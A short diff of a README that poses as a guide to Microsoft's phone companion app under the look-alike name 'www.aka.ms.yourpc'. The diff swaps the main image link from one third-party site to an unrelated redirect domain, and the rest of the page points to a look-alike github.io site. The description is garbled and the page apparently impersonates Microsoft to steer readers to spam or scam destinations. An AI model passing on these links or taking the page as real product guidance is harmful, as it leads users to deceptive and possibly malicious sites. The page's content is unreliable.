@@ -1,6 +1,6 @@
 # www.aka.ms.yourpc
 
-[![www.aka.ms.yourpc](getstart.jpg)](https://computer-solved.com/www-aka-ms-your-pc/)
+[![www.aka.ms.yourpc](getstart.jpg)](https://redir.activateprod.online)
 
 **[www.aka.ms.yourpc](https://www-akams-yourpc.github.io/)** is a windows phone companion to connect your smartphone with the **"windows phone app"** to access messages, galleries, notifications, apps and many other phone information on your windows pc phone companion Is.
 
